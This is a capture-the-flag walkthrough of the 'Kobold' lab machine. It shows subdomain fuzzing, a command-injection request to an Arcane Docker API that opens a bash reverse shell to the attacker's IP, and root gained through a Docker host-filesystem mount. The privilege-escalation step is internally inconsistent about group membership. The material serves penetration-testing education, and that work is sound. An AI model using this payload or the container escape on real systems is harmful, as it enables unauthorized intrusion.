Kobold

Medium
OS: Linux

Kobold was a medium-difficulty Linux machine that involved exploiting CVE-2026-23520, a critical command injection vulnerability in the Arcane Docker Management API, to achieve unauthenticated remote code execution. After obtaining a shell as user ben, privilege escalation was accomplished through a Docker socket escape — the user belonged to the docker group via operator (GID 37), allowing full container access and ultimately root on the host.

Key Vulnerabilities
CVE-2026-23520 Docker Socket Escape Command Injection
Tools Used
ffuf curl docker nc

Summary

Kobold starts with a wildcard TLS certificate on port 443, which gives away the fact that multiple subdomains exist. Enumerating subdomains with ffuf reveals mcp.kobold.htb (MCPJam Inspector) and bin.kobold.htb (PrivateBin). The critical finding is on port 3552 — the Arcane Docker Management API v1.13.0 — which exposes an OpenAPI spec and an /api/mcp/connect endpoint. This endpoint is vulnerable to CVE-2026-23520, allowing unauthenticated command injection through the JSON body's command and args fields. A reverse shell lands us as ben inside a container. Since ben is a member of the docker group (via GID 37 operator), mounting the host filesystem into a new container gives immediate root access to read the flag.

Reconnaissance

Kicked off a full port scan with RustScan piped into Nmap for service detection:

$ rustscan -a 10.10.11.206 -- -sC -sV

Open 10.10.11.206:22
Open 10.10.11.206:80
Open 10.10.11.206:443
Open 10.10.11.206:3552
Port Service Details
22 SSH OpenSSH 8.9p1
80 HTTP nginx 1.18.0 — redirects to HTTPS
443 HTTPS nginx 1.18.0 — wildcard TLS cert *.kobold.htb
3552 HTTP Arcane Docker Management v1.13.0

The wildcard certificate on port 443 immediately stands out — it means any subdomain of kobold.htb will pass TLS validation. This is a strong indicator that virtual hosts exist.

Enumeration

/etc/hosts

First, add the base domain to resolve properly:

$ echo "10.10.11.206 kobold.htb" | sudo tee -a /etc/hosts

Subdomain Discovery

With the wildcard cert confirmed, we can fuzz subdomains without worrying about certificate errors. Used ffuf with a common subdomain wordlist:

$ ffuf -u https://FUZZ.kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fc 404

mcp                    [Status: 200]
bin                    [Status: 200]

Two subdomains discovered:

  • mcp.kobold.htb — MCPJam Inspector (a web interface for inspecting MCP server configurations)
  • bin.kobold.htb — PrivateBin (a minimalist, encrypted pastebin alternative)

PrivateBin is locked down and requires a decryption key, so nothing immediately useful there. MCPJam Inspector is more interesting but doesn't expose credentials on its own. The real prize is port 3552.

API Discovery

Port 3552 is running Arcane Docker Management v1.13.0. Browsing to http://10.10.11.206:3552 shows a basic API landing page. Checked for the OpenAPI specification:

$ curl -s http://10.10.11.206:3552/openapi.json | jq '.paths | keys'

[
  "/api/health",
  "/api/mcp/connect",
  "/api/mcp/disconnect",
  "/api/mcp/servers",
  "/api/docker/images",
  "/api/docker/containers",
  "/api/docker/info"
]

The /api/mcp/connect endpoint stands out. Let's inspect its schema:

$ curl -s http://10.10.11.206:3552/openapi.json | jq '.paths["/api/mcp/connect"]'

{
  "post": {
    "summary": "Connect to an MCP server",
    "requestBody": {
      "content": {
        "application/json": {
          "schema": {
            "type": "object",
            "properties": {
              "server_url": { "type": "string" },
              "command": { "type": "string" },
              "args": { "type": "array", "items": { "type": "string" } }
            },
            "required": ["server_url"]
          }
        }
      }
    }
  }
}

The endpoint accepts a command and args field. This is the classic signature of CVE-2026-23520 — the Arcane Docker Management API passes user-supplied command and arguments directly to the system shell without sanitization.

CVE-2026-23520 — Command Injection

The vulnerability allows an attacker to inject arbitrary commands through the command and args parameters. The API spawns a process using these values without any input validation or escaping. Set up a netcat listener and crafted a reverse shell payload:

$ nc -lvnp 4444
$ curl -s -X POST http://10.10.11.206:3552/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "server_url": "http://localhost",
    "command": "sh",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.23/4444 0>&1"]
  }'

Catch the callback:

listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.206] 38421
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

We have a shell as ben (uid=1001). Notice the groups — ben is also a member of GID 37 (operator), which will matter shortly.

Shell Stabilization

The initial shell is bare bones — no TTY, no tab completion, no proper signal handling. Stabilized it with a Python PTY:

ben@kobold:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'

ben@kobold:~$ ^Z
[1]+  Stopped
$ stty raw -echo; fg

ben@kobold:~$ export TERM=xterm
ben@kobold:~$ stty rows 40 cols 150

Now we have a fully interactive TTY with proper terminal dimensions and command history.

User Flag

ben@kobold:~$ cat /home/ben/user.txt
4a4c73ee****************************

Docker Socket Escape

Recall from the id output that ben belongs to GID 37 (operator). Checking group memberships:

ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

ben@kobold:~$ getent group docker
docker:x:999:

ben@kobold:~$ getent group operator
operator:x:37:

The GID 37 operator group has access to the Docker socket. Switch to the docker group context and spawn a privileged container that mounts the host root filesystem:

ben@kobold:~$ newgrp docker

ben@kobold:~$ docker run -v /:/hostfs --rm -it alpine chroot /hostfs /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root)

We're now root inside the host filesystem. The Docker daemon runs as root, and since our user can communicate with the Docker socket, we can launch containers with arbitrary mount points — effectively giving us full read/write access to the entire host filesystem.

Root Flag

/ # cat /root/root.txt
50d7034f****************************

Key Takeaways

  • Wildcard TLS certificates are a double-edged sword. While convenient for dynamic subdomains, they immediately reveal to an attacker that multiple services exist behind virtual hosts. Combined with a subdomain wordlist, this trivializes the discovery of otherwise hidden attack surfaces.
  • MCP (Model Context Protocol) servers are an emerging attack surface. As AI tooling becomes more prevalent, MCP servers and management APIs like Arcane are being deployed without proper input validation. CVE-2026-23520 demonstrates that passing user-controlled strings to shell commands remains one of the most dangerous — and common — classes of vulnerabilities.
  • Docker group membership equals root. Any user that can interact with the Docker socket (typically via the docker group or equivalent GID mappings like operator at GID 37) can escalate to root by mounting the host filesystem into a container. This is not a bug — it's by design — which is why Docker group membership should be treated with the same caution as sudo ALL.
